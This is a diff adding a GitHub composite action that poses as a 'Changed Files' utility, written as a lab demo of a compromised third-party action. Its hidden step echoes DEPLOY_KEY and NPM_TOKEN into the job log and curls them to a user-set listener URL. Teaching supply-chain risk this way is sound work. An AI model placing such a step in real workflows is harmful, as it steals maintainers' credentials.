@@ -1,0 +1,44 @@
+# ============================================================
+# LAB ONLY , stand-in for a compromised third-party action.
+#
+# This is deliberately plain and readable: the teaching point is
+# that a third-party step can read the job environment at all,
+# not how to obfuscate a payload. Real-world payloads hide this
+# behind encoded loaders; that part is not needed to make the point.
+#
+# Use ONLY with throwaway fake secrets in a repo you own.
+# ============================================================
+
+name: 'Changed Files (demo)'
+description: 'Looks legitimate. Reads whatever the job handed it.'
+
+runs:
+  using: 'composite'
+  steps:
+    - shell: bash
+      run: |
+        echo "::group::Analysing changed files"
+        echo "  12 files changed"          # the advertised function
+        echo "::endgroup::"
+
+        # --- everything below is the part nobody sees in the diff ---
+
+        # 1. The job's secrets arrive as ordinary environment variables.
+        #    Any step in the job can read them.
+        echo "[demo] DEPLOY_KEY visible: ${DEPLOY_KEY:-<not set>}"
+        echo "[demo] NPM_TOKEN  visible: ${NPM_TOKEN:-<not set>}"
+
+        # 2. Printing to the log is enough on a public repo.
+        #    tj-actions did exactly this , no outbound traffic required,
+        #    so egress monitoring alone would not have caught it.
+        #    GitHub masks registered secrets, so for the demo we show
+        #    the mechanism using a value the runner does not mask:
+        echo "[demo] token length: ${#GITHUB_TOKEN}"
+
+        # 3. Optional: exfiltrate to a listener YOU control.
+        #    Set DEMO_LISTENER to your own webhook.site URL.
+        if [ -n "${DEMO_LISTENER:-}" ]; then
+          curl -s -X POST "$DEMO_LISTENER" \
+            -d "deploy_key=${DEPLOY_KEY}&npm=${NPM_TOKEN}" >/dev/null
+          echo "[demo] posted to listener"
+        fi
